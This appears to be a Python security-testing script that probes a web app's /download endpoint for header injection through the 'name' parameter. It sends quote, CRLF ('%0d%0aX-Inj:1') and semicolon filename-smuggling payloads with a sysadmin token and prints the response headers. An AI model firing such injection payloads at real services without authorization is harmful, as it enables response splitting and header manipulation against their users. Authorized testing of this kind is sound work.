import json,subprocess,os,uuid
H=os.environ['H']; BB=os.environ['BB']
TOK=open('/tmp/bac_SYSADMIN').read().strip()
tag='ZXH'+uuid.uuid4().hex[:5]
print("=== /download headers: does name reach Content-Disposition? ===")
import urllib.parse
for label,name in [('plain',f'zx{tag}.csv'),
                   ('quote',f'zx{tag}"-injected.csv'),
                   ('crlf',f'zx{tag}%0d%0aX-Inj:1.csv'),
                   ('semi',f'zx{tag};filename=evil.csv')]:
    enc=urllib.parse.quote(name,safe='')
    url=f'{H}/download?file_id=2799&name={enc}'
    cmd=['curl','-s','-m','30','-D','/tmp/h','-o','/tmp/d','-w','%{http_code}',url,
         '-H','token: '+TOK,'-H',BB]
    c=subprocess.run(cmd,capture_output=True,text=True).stdout.strip()
    hdrs=open('/tmp/h',encoding='utf-8',errors='replace').read()
    cd=[l for l in hdrs.splitlines() if l.lower().startswith(('content-disposition','content-type','x-inj'))]
    print(f"\n  {label:8} {c}")
    for l in cd: print(f"    {l[:140]}")
